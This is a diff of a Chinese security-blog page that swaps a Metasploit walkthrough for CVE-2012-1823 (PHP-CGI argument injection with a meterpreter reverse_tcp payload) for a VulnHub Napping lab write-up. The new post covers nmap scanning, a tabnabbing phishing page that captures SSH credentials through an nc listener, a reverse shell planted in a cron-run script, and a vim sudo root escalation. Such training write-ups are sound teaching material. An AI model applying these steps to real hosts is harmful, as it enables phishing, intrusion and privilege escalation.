@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CVE-2012-1823 PHP-CGI 远程代码执行漏洞 - 信息安全实验室</title>
+<title>vulnhub靶机Napping1.0.1教程 - 信息安全实验室</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" onload="this.onload=null;this.rel='stylesheet'">
@@ -20,9 +20,8 @@
   <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
   <div class="tags-bar">
     <a href="../index.html" class="tag tag-cyan">#首页</a>
-    <a href="../tags/list.html?tag=Vulhub" class="tag tag-cyan">#Vulhub</a>
-    <a href="../tags/list.html?tag=CVE" class="tag">#CVE</a>
-    <a href="../tags/list.html?tag=Web安全" class="tag tag-blue">#Web安全</a>
+    <a href="../tags/list.html?tag=vulnhub" class="tag tag-green">#vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="tag tag-blue">#渗透测试</a>
   </div>
   <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
 </div>
@@ -44,12 +43,11 @@
 <a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
 
 <div class="post">
-  <div class="post-date">2023 // 02 / 12</div>
-  <div class="post-title">CVE-2012-1823 PHP-CGI 远程代码执行漏洞</div>
+  <div class="post-date">2023 // 07 / 19</div>
+  <div class="post-title">vulnhub靶机Napping1.0.1教程</div>
   <div class="post-tags">
-    <a href="../tags/list.html?tag=Web安全" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">Web安全</a>
-    <a href="../tags/list.html?tag=Vulhub" class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">Vulhub</a>
-    <a href="../tags/list.html?tag=CVE" class="post-tag" style="background:#e4405f22;color:#e4405f;border:1px solid #e4405f44">CVE</a>
+    <a href="../tags/list.html?tag=vulnhub" class="post-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
   </div>
 
   <div class="post-content" style="display:block;border:none;padding:0;margin:0;">
@@ -57,54 +55,118 @@
     <nav class="post-toc">
       <span class="post-toc-title">// 目录</span>
       <ul>
-        <li class="toc-h4"><a href="#summary">漏洞危害</a></li>
-        <li class="toc-h4"><a href="#setup">漏洞搭建</a></li>
-        <li class="toc-h4"><a href="#exploit">漏洞利用</a></li>
+        <li class="toc-h4"><a href="#setup">靶场搭建</a></li>
+        <li class="toc-h4"><a href="#info">信息收集</a></li>
+        <li class="toc-h5"><a href="#info-discovery">主机发现</a></li>
+        <li class="toc-h5"><a href="#info-port">端口扫描</a></li>
+        <li class="toc-h5"><a href="#info-version">版本扫描</a></li>
+        <li class="toc-h5"><a href="#info-vuln">漏洞扫描</a></li>
+        <li class="toc-h4"><a href="#web">Web 渗透</a></li>
+        <li class="toc-h5"><a href="#web-register">注册登录</a></li>
+        <li class="toc-h5"><a href="#web-tabnabbing">Tabnabbing 钓鱼攻击</a></li>
+        <li class="toc-h4"><a href="#ssh">获取 SSH 凭证</a></li>
+        <li class="toc-h4"><a href="#privesc">权限提升</a></li>
+        <li class="toc-h5"><a href="#privesc-group">administrators 组</a></li>
+        <li class="toc-h5"><a href="#privesc-query">query.py 定时任务</a></li>
+        <li class="toc-h5"><a href="#privesc-reverse">反弹 Shell</a></li>
+        <li class="toc-h5"><a href="#privesc-vim">vim sudo 提权</a></li>
+        <li class="toc-h4"><a href="#flag">Flag</a></li>
       </ul>
     </nav>
 
-    <h4 id="summary">漏洞危害</h4>
-    <p>CVE-2012-1823 就是 php-cgi 这个 sapi 出现的漏洞，本漏洞只出现在 cgi 模式运行的 php 中。影响范围：php &lt; 5.3.12 或 php &lt; 5.4.2。</p>
-    <p>这个漏洞简单来说，就是用户请求的 querystring 被作为了 php-cgi 的参数，最终导致了一系列结果。</p>
-    <p>探究一下原理，RFC3875 中规定，当 querystring 中不包含没有解码的 = 号的情况下，要将 querystring 作为 cgi 的参数传入。所以，Apache 服务器按要求实现了这个功能。但 PHP 并没有注意到 RFC 的这一个规则，也许是曾经注意并处理了，处理方法就是 web 上下文中不允许传入参数。</p>
-    <p>于是就导致了 php 不光可以通过命令行参数的方式传入 php-cgi，也可以通过 querystring 的方式传入。</p>
+    <h4 id="setup">靶场搭建</h4>
+    <p>靶机下载地址：<a href="https://www.vulnhub.com/entry/napping-101,752/" target="_blank">Napping: 1.0.1 ~ VulnHub</a></p>
+    <p>下载后使用 VMware 或 VirtualBox 导入，网络设置为 NAT 模式。攻击机使用 Kali Linux。</p>
 
-    <h4 id="setup">漏洞搭建</h4>
-    <p>无其他搭建必须环境，搭建环境见 <a href="vulhub-setup.html">Vulhub 搭建方法</a>。</p>
+    <h4 id="info">信息收集</h4>
 
-    <h4 id="exploit">漏洞利用</h4>
-    <p>打开 msf：</p>
-    <pre><code>msfconsole</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image001.png" alt="msfconsole 启动"></p>
+    <h5 id="info-discovery">主机发现</h5>
+    <p>使用 arp-scan 发现目标主机：</p>
+    <pre><code>arp-scan -l</code></pre>
+    <p><img loading="lazy" src="../assets/np_image001.png" alt="arp-scan 主机发现"></p>
 
-    <p>搜索目标漏洞编号：</p>
-    <pre><code>search cve-2012-1823</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image002.png" alt="search cve-2012-1823"></p>
+    <h5 id="info-port">端口扫描</h5>
+    <pre><code>nmap --min-rate 10000 -p- 192.168.21.133</code></pre>
+    <p><img loading="lazy" src="../assets/np_image002.png" alt="nmap 端口扫描"></p>
 
-    <p>使用模块：</p>
-    <pre><code>use exploit/multi/http/php_cgi_arg_injection</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image003.png" alt="use module"></p>
+    <h5 id="info-version">版本扫描</h5>
+    <pre><code>nmap -sV -sT -O -p22,80 192.168.21.133</code></pre>
+    <p><img loading="lazy" src="../assets/np_image003.png" alt="nmap 版本扫描"></p>
+    <p>开放端口：22（SSH）、80（HTTP）。</p>
 
-    <p>这里提示需要使用 payload 并告诉我们 payload 的名字直接使用它：</p>
-    <pre><code>set payload php/meterpreter/reverse_tcp</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image004.png" alt="set payload"></p>
+    <h5 id="info-vuln">漏洞扫描</h5>
+    <pre><code>nmap --script=vuln -p22,80 192.168.21.133</code></pre>
+    <p><img loading="lazy" src="../assets/np_image004.png" alt="nmap 漏洞扫描"></p>
+    <p>主要以网站为突破口。</p>
 
-    <p>查看需要配置的信息：</p>
-    <pre><code>show options</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image005.png" alt="show options"></p>
+    <h4 id="web">Web 渗透</h4>
 
-    <p>我们要配置 rhost（目标靶机）和 rport（目标端口）：</p>
-    <pre><code>set rhost 192.168.221.129</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image006.png" alt="set rhost"></p>
-    <pre><code>set rport 8080</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image007.png" alt="set rport"></p>
+    <h5 id="web-register">注册登录</h5>
+    <p>访问 80 端口，是一个登录页面：</p>
+    <p><img loading="lazy" src="../assets/np_image005.png" alt="80 端口页面"></p>
+    <p>注册账号：</p>
+    <p><img loading="lazy" src="../assets/np_image006.png" alt="注册页面"></p>
+    <p>登录后发现存在跳转点，输入 URL 后会跳转到对应链接：</p>
+    <p><img loading="lazy" src="../assets/np_image007.png" alt="跳转点"></p>
+    <p><img loading="lazy" src="../assets/np_image008.png" alt="跳转点代码"></p>
 
-    <p>配置完后直接 run 就可以：</p>
-    <pre><code>run</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image008.png" alt="run 连接成功"></p>
+    <h5 id="web-tabnabbing">Tabnabbing 钓鱼攻击</h5>
+    <p>既然存在跳转功能，可以尝试 Tabnabbing 钓鱼攻击。构造两个 HTML 页面：</p>
 
-    <p>显示到这就是连接成功了，我们就能执行命令了：</p>
-    <p><img loading="lazy" src="../assets/vc_image009.png" alt="执行命令"></p>
+    <p><strong>b.html</strong> — 恶意页面，用于重定向父窗口：</p>
+    <p><img loading="lazy" src="../assets/np_image009.png" alt="a.html 代码"></p>
+
+    <p><strong>a.html</strong> — 伪装页面（如 Google 登录）：</p>
+    <p><img loading="lazy" src="../assets/np_image010.png" alt="b.html 代码"></p>
+
+    <p>启动 HTTP 服务：</p>
+    <pre><code>python -m http.server 8000 &</code></pre>
+
+    <p>监听 8000 端口接收数据：</p>
+    <pre><code>nc -lvvp 8000</code></pre>
+    <p><img loading="lazy" src="../assets/np_image011.png" alt="nc 监听"></p>
+
+    <h4 id="ssh">获取 SSH 凭证</h4>
+    <p>当管理员点击钓鱼链接后，成功捕获到用户名和密码：</p>
+    <p><img loading="lazy" src="../assets/np_image012.png" alt="捕获凭证"></p>
+    <pre><code>username=daniel&password=C@ughtm3napping123</code></pre>
+    <p>（%40 解码后为 @）</p>
+    <p>使用该凭证通过 SSH 登录靶机：</p>
+    <p><img loading="lazy" src="../assets/np_image013.png" alt="SSH 登录"></p>
+
+    <h4 id="privesc">权限提升</h4>
+
+    <h5 id="privesc-group">administrators 组</h5>
+    <p>执行 <code>sudo -l</code> 失败，查看用户组信息：</p>
+    <p><img loading="lazy" src="../assets/np_image014.png" alt="用户组信息"></p>
+    <p>查找 daniel 用户所属的 administrators 组可执行的文件：</p>
+    <pre><code>find / -group administrators 2>/dev/null</code></pre>
+    <p><img loading="lazy" src="../assets/np_image015.png" alt="find 查找组文件"></p>
+
+    <h5 id="privesc-query">query.py 定时任务</h5>
+    <p>查看 <code>query.py</code> 文件内容：</p>
+    <p><img loading="lazy" src="../assets/np_image016.png" alt="query.py 内容"></p>
+    <p>该文件每两分钟自动执行一次，并且当前用户有写入权限，可以写入反弹 Shell：</p>
+    <p><img loading="lazy" src="../assets/np_image017.png" alt="写入 Shell"></p>
+    <p><img loading="lazy" src="../assets/np_image018.png" alt="Shell 内容"></p>
+
+    <h5 id="privesc-reverse">反弹 Shell</h5>
+    <p>等待定时任务自动执行，监听本地端口等待连接：</p>
+    <p><img loading="lazy" src="../assets/np_image019.png" alt="等待连接"></p>
+    <p><img loading="lazy" src="../assets/np_image020.png" alt="反弹成功"></p>
+    <p><img loading="lazy" src="../assets/np_image021.png" alt="反弹成功 2"></p>
+
+    <h5 id="privesc-vim">vim sudo 提权</h5>
+    <p>查看 sudo 权限：</p>
+    <pre><code>sudo -l</code></pre>
+    <p><img loading="lazy" src="../assets/np_image022.png" alt="sudo -l"></p>
+    <p>发现可以通过 <code>/usr/bin/vim</code> 以 root 权限执行命令，使用 vim 提权：</p>
+    <pre><code>sudo /usr/bin/vim -c ':!/bin/sh'</code></pre>
+    <p><img loading="lazy" src="../assets/np_image023.png" alt="vim 提权"></p>
+    <p>提权完成，获取 root 权限。</p>
+
+    <h4 id="flag">Flag</h4>
+    <p><img loading="lazy" src="../assets/np_image024.png" alt="Flag"></p>
 
   </div>
 </div>
